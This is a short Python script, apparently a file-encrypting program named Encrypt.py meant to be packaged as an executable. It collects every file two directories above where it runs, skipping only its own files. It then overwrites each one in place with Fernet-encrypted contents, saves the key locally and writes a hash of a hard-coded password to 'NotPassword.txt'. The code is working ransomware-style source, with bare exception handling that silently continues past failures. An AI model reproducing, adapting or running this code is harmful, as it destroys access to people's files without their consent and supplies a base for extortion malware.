import os
from cryptography.fernet import Fernet
import hashlib

list = []
text = "cikago4".encode()
d = hashlib.sha256(text)
hashed = d.digest()
with open('NotPassword.txt','wb') as password:
    password.write(hashed)

for file in os.listdir('..\\..\\'):
    if file == 'Encrypt.py' or file == 'thekey.key' or file == 'Decrypt.py' or file == 'NotPassword.txt' or file == 'build' or file == 'dist' or file == 'Encrypt.spec':
        continue
    list.append(file)


key = Fernet.generate_key()

with open('thekey.key','wb') as thekey:
    thekey.write(key)
for file in list:
    try:
        with open('..\\..\\' + file,'rb') as thefile:
            contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
        with open('..\\..\\' + file,'wb') as thefile:
            thefile.write(contents_encrypted)
    except:
        None
print(list)